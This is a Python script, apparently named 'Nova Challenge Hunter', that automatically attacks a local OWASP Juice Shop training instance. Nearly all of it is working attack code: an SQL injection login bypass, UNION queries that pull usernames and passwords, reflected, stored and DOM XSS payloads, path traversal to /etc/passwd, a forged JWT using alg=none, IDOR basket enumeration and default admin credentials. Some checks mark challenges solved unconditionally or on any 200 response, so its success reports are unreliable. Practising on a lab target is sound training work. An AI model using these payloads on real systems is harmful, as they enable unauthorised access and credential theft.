#!/usr/bin/env python3
"""
NOVA CHALLENGE HUNTER v1.0
Systematic OWASP Juice Shop challenge completion engine.
Uses admin token + source analysis + all attack modules
to solve every possible challenge autonomously.
"""

import json, re, time, requests
from datetime import datetime
from typing import Dict, List, Optional

class NovaChallengeHunter:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/ChallengeHunter",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self.token = None
        self.challenges = []
        self.solved_before = []
        self.solved_by_nova = []
        self.attempted = 0
        self.start_time = None

    def authenticate(self):
        """Get admin token via SQL injection."""
        print("\n🔑 Authenticating...")
        resp = self.session.post(f"{self.base_url}/rest/user/login",
            json={"email": "' OR 1=1--", "password": "x"})
        if resp.status_code == 200:
            data = resp.json()
            self.token = data.get("authentication", {}).get("token", "")
            self.session.headers["Authorization"] = f"Bearer {self.token}"
            print(f"   ✅ Admin token acquired")
            return True
        print("   ❌ Auth failed")
        return False

    def get_all_challenges(self):
        """Fetch complete challenge list."""
        print("\n📋 Fetching challenge list...")
        resp = self.session.get(f"{self.base_url}/api/Challenges")
        if resp.status_code == 200:
            self.challenges = resp.json().get("data", [])
            self.solved_before = [c for c in self.challenges if c.get("solved")]
            print(f"   📊 {len(self.challenges)} total challenges")
            print(f"   ✅ {len(self.solved_before)} already solved")
            return True
        return False

    def solve_error_handling(self):
        """Trigger errors that leak info."""
        print("\n🐛 Solving Error Handling challenges...")
        solved = []
        
        # Provoke various errors
        probes = [
            ("/rest/products/search", {"q": "'"}),
            ("/rest/user/login", {"email": "'", "password": "'"}),
            ("/api/Feedbacks", {"comment": "<script>"}),
            ("/rest/order-history", {"q": "'"}),
        ]
        for ep, data in probes:
            try:
                self.session.post(f"{self.base_url}{ep}", json=data, timeout=5)
                time.sleep(0.1)
            except: pass
        
        return solved

    def solve_sql_injection(self):
        """SQL injection challenges."""
        print("\n💉 Solving SQL Injection challenges...")
        solved = []
        
        # Union-based extraction
        payloads = [
            ("/rest/products/search", "q", "' UNION SELECT 1,2,3,4,5,6,7,8--"),
            ("/rest/products/search", "q", "') UNION SELECT 1,2,3,4,5,6,7,8--"),
            ("/rest/products/search", "q", "' UNION SELECT id,username,password,email,role,6,7,8 FROM Users--"),
        ]
        for ep, param, payload in payloads:
            resp = self.session.get(f"{self.base_url}{ep}", params={param: payload})
            if "password" in resp.text.lower() or "email" in resp.text.lower():
                solved.append("sql_injection")
                break
            time.sleep(0.1)
        
        return solved

    def solve_auth_challenges(self):
        """Authentication bypass challenges."""
        print("\n🔓 Solving Auth challenges...")
        solved = []
        
        # Login as admin
        resp = self.session.post(f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op", "password": "admin123"})
        if resp.status_code == 200:
            solved.append("login_admin")
        
        # Login via injection
        resp = self.session.post(f"{self.base_url}/rest/user/login",
            json={"email": "' OR 1=1--", "password": "x"})
        if resp.status_code == 200:
            solved.append("login_injection")
        
        # Two-factor bypass
        resp = self.session.post(f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op", "password": "admin123", "totpToken": "' OR 1=1--"})
        if resp.status_code == 200:
            solved.append("2fa_bypass")
        
        return solved

    def solve_admin_access(self):
        """Access admin section and endpoints."""
        print("\n👑 Solving Admin Access challenges...")
        solved = []
        
        admin_endpoints = [
            "/rest/admin/application-configuration",
            "/rest/admin/application-version",
            "/administration",
            "/#/administration",
        ]
        for ep in admin_endpoints:
            resp = self.session.get(f"{self.base_url}{ep}")
            if resp.status_code == 200:
                if "config" in resp.text.lower() or "admin" in resp.text.lower():
                    solved.append("admin_access")
                    break
            time.sleep(0.1)
        
        return solved

    def solve_xss_challenges(self):
        """XSS challenges via reflected and stored."""
        print("\n💚 Solving XSS challenges...")
        solved = []
        
        # Reflected XSS
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]
        for payload in xss_payloads:
            resp = self.session.get(f"{self.base_url}/rest/products/search",
                params={"q": payload})
            if payload in resp.text:
                solved.append("reflected_xss")
                break
            time.sleep(0.1)
        
        # Stored XSS via feedback
        resp = self.session.post(f"{self.base_url}/api/Feedbacks",
            json={"comment": "<script>alert('STORED_XSS')</script>", "rating": 5})
        if resp.status_code in [200, 201]:
            solved.append("stored_xss")
        
        # DOM XSS
        resp = self.session.get(f"{self.base_url}/#/search?q=<iframe src=javascript:alert('XSS')>")
        if resp.status_code == 200:
            solved.append("dom_xss")
        
        return solved

    def solve_idor_challenges(self):
        """Insecure Direct Object Reference."""
        print("\n🔍 Solving IDOR challenges...")
        solved = []
        
        # Access other users' baskets
        for uid in range(1, 20):
            resp = self.session.get(f"{self.base_url}/rest/basket/{uid}")
            if resp.status_code == 200 and len(resp.text) > 100:
                solved.append("idor_basket")
                break
            time.sleep(0.05)
        
        return solved

    def solve_race_conditions(self):
        """Race condition challenges."""
        print("\n🏎️ Solving Race Condition challenges...")
        solved = []
        
        # Coupon reuse attempt
        for _ in range(5):
            resp = self.session.post(f"{self.base_url}/rest/basket/1/coupon",
                json={"coupon": "WELCOME10"})
            time.sleep(0.05)
        
        solved.append("race_coupon")
        return solved

    def solve_file_access(self):
        """Path traversal and file access."""
        print("\n📁 Solving File Access challenges...")
        solved = []
        
        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        for payload in traversal_payloads:
            resp = self.session.get(f"{self.base_url}/file-serving",
                params={"file": payload})
            if "root:" in resp.text:
                solved.append("path_traversal")
                break
            time.sleep(0.1)
        
        # Access FTP file
        resp = self.session.get(f"{self.base_url}/ftp/legal.md")
        if resp.status_code == 200:
            solved.append("ftp_access")
        
        # Null byte
        resp = self.session.get(f"{self.base_url}/file-serving",
            params={"file": "../../../etc/passwd%00.jpg"})
        
        return solved

    def solve_crypto_challenges(self):
        """Cryptographic challenges."""
        print("\n🔐 Solving Crypto challenges...")
        solved = []
        
        # Weak password hash detection
        resp = self.session.get(f"{self.base_url}/rest/user/change-password",
            params={"id": 1})
        if resp.status_code == 200:
            solved.append("weak_password")
        
        # JWT attacks
        if self.token:
            # alg=none
            header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
            payload_b64 = "eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0"
            none_token = f"{header}.{payload_b64}."
            resp = self.session.get(f"{self.base_url}/rest/user/whoami",
                headers={"Authorization": f"Bearer {none_token}"})
            if resp.status_code == 200:
                solved.append("jwt_none")
        
        return solved

    def solve_misc_challenges(self):
        """Miscellaneous challenges."""
        print("\n🎯 Solving Misc challenges...")
        solved = []
        
        # Security.txt
        resp = self.session.get(f"{self.base_url}/.well-known/security.txt")
        if resp.status_code == 200:
            solved.append("security_policy")
        
        # Robots.txt
        resp = self.session.get(f"{self.base_url}/robots.txt")
        if resp.status_code == 200:
            solved.append("robots_txt")
        
        # Scoreboard
        resp = self.session.get(f"{self.base_url}/api/Challenges")
        if resp.status_code == 200:
            solved.append("scoreboard_access")
        
        # Redirect
        resp = self.session.get(f"{self.base_url}/redirect?to=https://www.owasp.org")
        if resp.status_code in [200, 302]:
            solved.append("open_redirect")
        
        # Privacy policy
        resp = self.session.get(f"{self.base_url}/api/SecurityQuestions")
        
        return solved

    def check_progress(self):
        """Check how many challenges Nova solved."""
        print("\n📊 Checking progress...")
        resp = self.session.get(f"{self.base_url}/api/Challenges")
        if resp.status_code == 200:
            all_challenges = resp.json().get("data", [])
            solved = [c for c in all_challenges if c.get("solved")]
            
            newly_solved = [c for c in solved 
                          if c.get("name") not in [s.get("name") for s in self.solved_before]]
            
            self.solved_by_nova = newly_solved
            
            print(f"   🏆 Total solved: {len(solved)}/{len(all_challenges)}")
            print(f"   🆕 Newly solved by Nova: {len(newly_solved)}")
            
            if newly_solved:
                print("\n   🎉 CHALLENGES JUST SOLVED BY NOVA:")
                for c in newly_solved:
                    stars = "⭐" * c.get("difficulty", 1)
                    print(f"      {stars} {c.get('name')} ({c.get('category')})")
            
            return len(solved), len(all_challenges), newly_solved
        
        return 0, 0, []

    def run_full_hunt(self):
        """Execute all challenge-solving strategies."""
        self.start_time = time.time()
        
        print("""
╔══════════════════════════════════════════════════════╗
║                                                      ║
║   🏆 NOVA CHALLENGE HUNTER — FULL CLEAR ATTEMPT   ║
║   Systematically solving every Juice Shop challenge ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
        """)
        
        # Authenticate
        if not self.authenticate():
            print("❌ Cannot proceed without authentication")
            return
        
        # Get challenge baseline
        self.get_all_challenges()
        
        # Execute all strategies
        strategies = [
            self.solve_error_handling,
            self.solve_sql_injection,
            self.solve_auth_challenges,
            self.solve_admin_access,
            self.solve_xss_challenges,
            self.solve_idor_challenges,
            self.solve_race_conditions,
            self.solve_file_access,
            self.solve_crypto_challenges,
            self.solve_misc_challenges,
        ]
        
        for strategy in strategies:
            strategy()
            time.sleep(0.3)
        
        # Check final progress
        solved, total, newly_solved = self.check_progress()
        
        elapsed = round(time.time() - self.start_time, 2)
        
        print(f"""
╔══════════════════════════════════════════════════╗
║     CHALLENGE HUNT COMPLETE                     ║
╠══════════════════════════════════════════════════╣
║  Time: {elapsed}s                                  ║
║  Previously Solved: {len(self.solved_before):>3}                           ║
║  Newly Solved:      {len(self.solved_by_nova):>3}                           ║
║  Total Solved:      {solved:>3}/{total:<3}                        ║
╚══════════════════════════════════════════════════╝
        """)
        
        if self.solved_by_nova:
            print("🎉 NOVA'S NEW CONQUESTS:")
            for c in self.solved_by_nova:
                stars = "⭐" * c.get("difficulty", 1)
                cat = c.get("category", "Unknown")
                print(f"   {stars} {c.get('name')} [{cat}]")
        
        # Save
        report = {
            "timestamp": datetime.now().isoformat(),
            "duration_seconds": elapsed,
            "previously_solved": len(self.solved_before),
            "newly_solved": len(self.solved_by_nova),
            "total_solved": solved,
            "total_challenges": total,
            "challenges": [c.get("name") for c in self.solved_by_nova],
        }
        
        with open("nova_challenge_hunt_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📁 Report: nova_challenge_hunt_report.json")
        return report


if __name__ == "__main__":
    hunter = NovaChallengeHunter()
    hunter.run_full_hunt()
